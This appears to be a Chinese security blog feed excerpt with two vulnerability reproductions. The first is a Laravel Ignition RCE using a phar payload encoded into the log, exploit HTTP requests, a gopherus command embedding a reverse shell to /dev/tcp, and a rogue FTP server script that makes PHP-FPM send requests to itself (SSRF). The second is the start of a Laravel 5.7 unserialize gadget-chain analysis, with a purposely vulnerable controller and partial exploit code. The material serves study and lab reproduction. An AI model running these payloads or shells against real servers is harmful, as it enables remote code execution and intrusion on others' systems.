=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=6C=00=75=00=61=00=58=00=52=00=70=00=59=00=57=00=78=00=70=00=65=00=6D=00=56=00=6B=00=49=00=6A=00=74=00=69=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=54=00=47=00=6C=00=74=00=61=00=58=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=48=00=4A=00=76=00=59=00=32=00=56=00=7A=00=63=00=32=00=39=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=6A=00=64=00=58=00=4A=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=55=00=41=00=41=00=41=00=42=00=6B=00=64=00=57=00=31=00=74=00=65=00=51=00=51=00=41=00=41=00=41=00=43=00=49=00=66=00=62=00=64=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=43=00=49=00=66=00=62=00=64=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=30=00=5A=00=58=00=4E=00=30=00=45=00=31=00=72=00=6D=00=50=00=6C=00=33=00=47=00=64=00=63=00=55=00=68=00=31=00=33=00=63=00=2B=00=58=00=47=00=77=00=6D=00=37=00=50=00=64=00=2B=00=47=00=76=00=59=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>把不需要的内容清除：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>
<span class="err">Connection:</span> <span class="err">close</span>
<span class="err">Content-Length:</span> <span class="mi">297</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;theoyu&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602221221071.png" alt="image-20210602221221071"></p>
<p>接下来直接打就行。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>
<span class="err">Connection:</span> <span class="err">close</span>
<span class="err">Content-Length:</span> <span class="mi">237</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;theoyu&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;phar:///phpStudy/PHPTutorial/WWW/cms/laravel/storage/logs/laravel.log/test.txt&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h2 id="0x04-利用ftp-ssrf攻击fpm">0x04 利用FTP SSRF攻击FPM</h2>
<p>这其实算是一个比较老的点，但我最近一次接触还是在<a href="https://theoyu.top/posts/bluehat/">蓝帽杯 One Pointer PHP</a>上，这里的构造基本上相同。</p>
<ul>
<li>file_get_contents()连接到我们的FTP服务器，并下载file.txt。</li>
<li>file_put_contents()连接到我们的FTP服务器，并将其上传回file.txt。</li>
</ul>
<p>我们使用FTP协议的被动模式让file_get_contents()在我们的服务器上下载一个文件，当它试图使用file_put_contents()把它上传回去时，我们将告诉它把文件发送到127.0.0.1:9000(fpm绑定的本地端口)。</p>
<p>这样，我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包，从而执行代码，造成SSRF。</p>
<p>但github拉取的镜像复现失败了，应该是FPM的问题，不过我们就当有，直接起一个FPM镜像来。</p>
<p>gopherus生成payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python gopherus.py --exploit fastcgi
/var/www/public/index.php  <span class="c1"># 这里输入的是目标主机上一个已知存在的php文件</span>
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/ip/port1 0&gt;&amp;1&#34;</span>  <span class="c1"># 这里输入的是要执行的命</span>
</code></pre></div><p>拿到_后门的部分后写入ftp脚本中：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># @Time    : 2021/1/13 6:56 下午</span>
<span class="c1"># @Author  : tntaxin</span>
<span class="c1"># @File    : ftp_redirect.py</span>
<span class="c1"># @Software:</span>

<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>

<span class="c1"># 对gopherus生成的payload进行一次urldecode</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">23</span>
<span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
<span class="n">sk</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">sk</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="c1"># ftp被动模式的passvie port,监听到1234</span>
<span class="n">sk2</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
<span class="n">sk2</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="mi">1234</span><span class="p">))</span>
<span class="n">sk2</span><span class="o">.</span><span class="n">listen</span><span class="p">()</span>

<span class="c1"># 计数器，用于区分是第几次ftp连接</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">conn</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="n">sk</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># USER aaa\r\n  客户端传来用户名</span>
    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;220 ready</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 ready</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span>
    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;215 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># SIZE /123\r\n  客户端询问文件/123的大小</span>
    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;213 3 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;300 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># EPSV\r\n&#39;</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># PASV\r\n  客户端告诉服务端进入被动连接模式</span>
    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;227 127,0,0,1,4,210</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;227 127,0,0,1,35,40</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># 端口计算规则：35*256+40=9000</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span>
    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;125 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 告诉客户端可以开始数据连接了</span>
        <span class="c1"># 新建一个socket给服务端返回我们的payload</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;建立连接!&#34;</span><span class="p">)</span>
        <span class="n">conn2</span><span class="p">,</span> <span class="n">address2</span> <span class="o">=</span> <span class="n">sk2</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
        <span class="n">conn2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">conn2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;断开连接!&#34;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;150 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">()</span>

    <span class="c1"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span>
    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;226 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>

</code></pre></div><p>这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的payload；当客户端第二次连接的时候将客户端的连接重定向到127.0.0.1:9000，也就是目标主机上php-fpm服务的端口，从而造成SSRF，攻击其php-fpm。</p>
<p>最后构造如下请求</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;username&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;ftp://aaa@ip:1234/123&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>注意1234是我们服务器起ftp的端口，port1是我们服务器另起一个端口处理反弹过来的shell。</p>
<h2 id="0x05-参考">0x05 参考</h2>
<p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p>
<p><a href="https://www.anquanke.com/post/id/235228#h2-1">https://www.anquanke.com/post/id/235228#h2-1</a></p>
]]></content>
		</item>
		
		<item>
			<title>laravel v5.7反序列化rce</title>
			<link>https://theoyu.top/posts/codeaudit/laravel57/</link>
			<pubDate>Sun, 30 May 2021 21:25:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/codeaudit/laravel57/</guid>
			<description>前言 Laravel is a web application framework with expressive, elegant syntax. We’ve already laid the foundation — freeing you to create without sweating the small things.
这个CVE从开始入手到今天正式完工大概花了一周左右吧&amp;hellip;感觉自己还是走了不少弯路的，也在这里分享一下自己的心得体验。
首先初探一个自己不熟悉的框架，除非是CTF那样时间比较紧迫的情况，还是建议花几个小时看一看文档和一些经典的机制，这里我是跟着3rsh1学长这几篇博客走的。后续呢我收藏了好几篇相关的分析文章，打了一个很大的架势开始动手。然后就是跟着别人的流程，一步一步调，但是这样效率很低，即使最后复现成功，要想说一遍流程都说不出来。
后来就直接干脆关了全部的文章，还是自己一步一步来，所以这篇文章可能会说的有一些啰嗦，不过也是我分析这个CVE的心得体会吧。
环境搭建 首先起一个框架：
composer create-project laravel/laravel laravel57 &amp;#34;5.7.*&amp;#34; cd laravel57 php artisan serve laravel5.7本身是没用可以反序列化的入口的，所以需要我们自己写一个路由和控制器。
在 laravel57/routes/web.php 文件中添加一条路由
&amp;lt;?php Route::get(&amp;#34;/theoyu&amp;#34;,&amp;#34;\App\Http\Controllers\DemoController@demo&amp;#34;); ?&amp;gt;在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器
&amp;lt;?php namespace App\Http\Controllers; use Illuminate\Http\Request; class DemoController extends Controller { public function demo() { if(isset($_GET[&amp;#39;c&amp;#39;])){ $code = $_GET[&amp;#39;c&amp;#39;]; unserialize($code); } else{ highlight_file(__FILE__); } return &amp;#34;Welcome to laravel5.</description>
			<content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>Laravel is a web application framework with expressive, elegant syntax.  We’ve already laid the foundation — freeing you to create without  sweating the small things.</p>
<p>这个CVE从开始入手到今天正式完工大概花了一周左右吧&hellip;感觉自己还是走了不少弯路的，也在这里分享一下自己的心得体验。</p>
<p>首先初探一个自己不熟悉的框架，除非是CTF那样时间比较紧迫的情况，还是建议花几个小时看一看文档和一些经典的机制，这里我是跟着3rsh1学长这<a href="https://www.3rsh1.cool/2020/07/23/lavarel_zhuan_ti_1/">几篇博客</a>走的。后续呢我收藏了好几篇相关的分析文章，打了一个很大的架势开始动手。然后就是跟着别人的流程，一步一步调，但是这样效率很低，即使最后复现成功，要想说一遍流程都说不出来。</p>
<p>后来就直接干脆关了全部的文章，还是自己一步一步来，所以这篇文章可能会说的有一些啰嗦，不过也是我分析这个CVE的心得体会吧。</p>
<h3 id="环境搭建">环境搭建</h3>
<p>首先起一个框架：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">composer create-project laravel/laravel laravel57 <span class="s2">&#34;5.7.*&#34;</span>
<span class="nb">cd</span> laravel57
php artisan serve
</code></pre></div><p>laravel5.7本身是没用可以反序列化的入口的，所以需要我们自己写一个路由和控制器。</p>
<p>在 <strong>laravel57/routes/web.php</strong> 文件中添加一条路由</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s2">&#34;/theoyu&#34;</span><span class="p">,</span><span class="s2">&#34;\App\Http\Controllers\DemoController@demo&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">namespace</span> <span class="nx">App\Http\Controllers</span><span class="p">;</span>

<span class="k">use</span> <span class="nx">Illuminate\Http\Request</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">DemoController</span> <span class="k">extends</span> <span class="nx">Controller</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">demo</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
            <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
            <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="s2">&#34;Welcome to laravel5.7&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h3 id="漏洞分析">漏洞分析</h3>
<p>可用于执行命令的功能位于 <strong>Illuminate/Foundation/Testing/PendingCommand</strong> 类的 <strong>run</strong> 方法中，而该 <strong>run</strong> 方法在 <strong>__destruct</strong> 方法中调用。</p>
<p>我们先看一看<strong>PendingCommand</strong> 这个类有哪些属性</p>
<pre><code>$this-&gt;test;        //一个实例化的类 
$this-&gt;app;         //一个实例化的类 
$this-&gt;command;     //要执行的php函数 system
$this-&gt;parameters;  //要执行的php函数的参数  array('whoami')
</code></pre><p>至于<code>$test</code>和<code>$app</code>具体是什么，我们暂时还不得而知，不过我们看看下面需要执行的命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530183118698.png" alt="image-20210530183118698"></p>
<p>也就是说，要想命令执行，首先我们得顺利走到try这一步，然后<code>$app[Kernel::class]</code>需要返回一个具有call方法的实例。</p>
<p>我们先简单写一个雏形，看看调试结果。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530143546672.png" alt="image-20210530143546672"></p>
<p>我们首先会进入<code>mockConsoleOutput()</code>当中，纵观这个函数有两个地方我们需要注意：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530184311920.png" alt="image-20210530184311920"></p>
<p>因为我们还没有对<code>$test</code>做任何的处理，所有<code>$test</code>本身没有任何的属性，所以标注1的<code>test-&gt;expectedQuestions</code>自然会报错，同理在标注2中进入的<code>createABufferedOutputMock()</code>也有一步<code>test-&gt;expectedOutput</code>会失败，如下图。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530143630253.png" alt="image-20210530143630253"></p>
<p>但在两个属性要想直接构造是比较困难的，这里平时做ctf会容易想到一点也就是魔术方法<code>__get()</code>,我们选择GenericUser类</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530185536721.png" alt="image-20210530185536721"></p>
<p>构造如下，只对<code>$test</code>进行更改</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530150611621.png" alt="image-20210530150611621"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530151122289.png" alt="image-20210530151122289"></p>
<p>可以看到我们成功走到了<code>mockConsoleOutput()</code>的最后一步</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">(</span><span class="nx">OutputStyle</span><span class="o">::</span><span class="na">class</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$mock</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$mock</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div><p>但是由于我们<code>$app</code>还只是一个字符串，并没有<code>bind</code>方法，这是因为我最开始的时候走远了，实际上在<strong>PendingCommand</strong>中就写有<code>$app</code>是在<code>\Illuminate\Foundation\Application</code>的实例，同时<code>Application </code>类是继承自<code>Illuminate\Container\Container</code>。在<code>Container</code>类中我们可以找到对应的<code>bind</code>函数,ok那么现在构造如下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530162308651.png" alt="image-20210530162308651"></p>
<p>再次断点调试,我们终于走到了命令执行最关键的一步，但是在这一步直接挂掉了。</p>
<p><code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code></p>
<p>我们把这一步拆成三步，断点调试：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530162741610.png" alt="image-20210530162741610"></p>
<p>我们发现<code>Kernel::class</code>是一个常量，返回<code>Illuminate\Contracts\Console\Kernel</code></p>
<p>发现是在第二步就直接挂掉了，我们跟进看看。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530195743543.png" alt="image-20210530195743543"></p>
<p>这里进入到了一个父类<code>Container</code>的make函数，跟进resolve</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530200136412.png" alt="image-20210530200136412"></p>
<p>这里的标注1很关键，首先instances数组本身是我们可控的，然后键名<code>$anstract</code>也已知，那我们完全可以控制这里的return返回值，也就控制了第二步中<code>$this-&gt;app[Kernel::class]</code>的返回值。</p>
<p>同理，我们跟进标注2 的<code>getConcrete()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530200455485.png" alt="image-20210530200455485"></p>
<p>可以发现这里同样可以控制返回，那现在我们需要明确的问题是，我们应该返回一个怎样的对象，其含有<code>call()</code>方法可以让我们进行命令执行。</p>
<p>就在<code>Illuminate\Foundation\Application</code>所继承的 <code>Illuminate\Container\Container</code>下，找到了我们需要的函数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530201258106.png" alt="image-20210530201258106"></p>
<p>这里进入的话会发现调用了<code>call_user_func_array</code>回调函数，至此我们的利用链也差不多分析结束。作者返回的是子类<code>Application</code>,不过是继承关系的也都没有关系嘛。</p>
<p>那么如果用标注1<code>instances[]</code>的方法话，构造如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Auth</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">GenericUser</span>
<span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$attributes</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="k">array</span> <span class="nv">$attributes</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">attributes</span> <span class="o">=</span> <span class="nv">$attributes</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$array</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;expectedOutput&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;1&#34;</span><span class="p">),</span> <span class="s1">&#39;expectedQuestions&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;1&#34;</span><span class="p">));</span>
<span class="nv">$test</span><span class="o">=</span><span class="k">new</span> <span class="nx">GenericUser</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Foundation</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Application</span>
<span class="p">{</span>
